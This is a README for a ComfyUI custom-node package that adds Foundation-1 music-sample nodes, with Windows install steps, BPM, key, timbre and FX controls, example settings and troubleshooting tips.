# 🎵 scg_Foundation-1-comfyUI - Control Music Samples Easily

[![Download the app](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)

## 🧭 What this is

scg_Foundation-1-comfyUI adds ComfyUI nodes for RoyalCities Foundation-1. It helps you build text-to-sample music with control over BPM, key, timbre, and FX.

Use it if you want a simple way to shape music output from text prompts and set core audio traits before you generate a sample.

## 💻 What you need

- A Windows PC
- ComfyUI installed
- An internet connection for the first download
- Enough free disk space for model files and audio assets
- A recent GPU if you want faster generation

## 📥 Download

Visit this page to download and get the files you need:

[https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)

## 🛠️ Install on Windows

1. Open the download page in your browser.
2. Download the repository files.
3. If you get a ZIP file, right-click it and choose Extract All.
4. Open your ComfyUI folder.
5. Copy the `scg_Foundation-1-comfyUI` files into the `custom_nodes` folder inside ComfyUI.
6. Start ComfyUI.
7. If the app asks for extra Python packages, let it install them.
8. Restart ComfyUI after the install finishes.

## ▶️ Run the app

1. Open ComfyUI on Windows.
2. Load the workflow that uses the Foundation-1 nodes.
3. Add your text prompt.
4. Set the music controls you want:
   - BPM
   - Key
   - Timbre
   - FX
5. Run the workflow.
6. Save the output sample when it finishes.

## 🎛️ Main controls

### BPM
Sets the speed of the music. Use a lower BPM for a calm feel. Use a higher BPM for a faster feel.

### Key
Sets the musical key. This helps keep the sample in a clear musical range.

### Timbre
Changes the tone of the sound. Use it to shape the texture, color, and character of the output.

### FX
Adds or changes effects in the sample. This can help with space, depth, grit, or shine.

## 🧩 How to use it well

- Start with a short prompt.
- Pick one BPM range first.
- Set the key before you change other parts.
- Change timbre in small steps.
- Add FX only after the main sound feels right.
- Keep notes on settings that give you results you like.

## 🗂️ Example setup

- Prompt: lo-fi piano loop with warm tape feel
- BPM: 84
- Key: A minor
- Timbre: soft, warm, round
- FX: light reverb, gentle saturation

- Prompt: bright synth sample with punchy rhythm
- BPM: 128
- Key: C major
- Timbre: sharp, clean, glossy
- FX: short delay, subtle chorus

## 🔎 If something does not work

- Make sure ComfyUI is closed before copying files.
- Check that the node files are in the right `custom_nodes` folder.
- Restart ComfyUI after install.
- Check for missing model files if the workflow will not load.
- If a node stays red, open the console and look for the name of the missing file or package.
- Try a fresh download if files seem incomplete.

## 📁 Folder layout

A common setup looks like this:

- `ComfyUI/`
  - `custom_nodes/`
    - `scg_Foundation-1-comfyUI/`
  - `models/`
  - `output/`

## 🎼 Best results on Windows

- Use a modern version of Windows 10 or Windows 11.
- Keep your GPU drivers up to date.
- Close large apps while generating audio.
- Use a short prompt when you test a new workflow.
- Save working presets so you can reuse them later

## 🔗 Helpful links

- Repository: [https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)
- Main download page: [https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)

## 🧠 What the nodes help you control

The Foundation-1 nodes give you a simple way to guide sample generation with:

- Tempo control for rhythm feel
- Key control for musical direction
- Timbre control for sound character
- FX control for texture and space
- Text prompts for content and style

## 🧪 First test to run

Use this first test when you open the app:

- Text prompt: simple ambient sample
- BPM: 90
- Key: D minor
- Timbre: soft pad
- FX: light room reverb

If the sample builds and plays, the setup is working

## 📦 File types you may see

You may find files such as:

- `.zip`
- `.json`
- `.py`
- model folders
- audio output files

Keep the folder structure the same when you move files into ComfyUI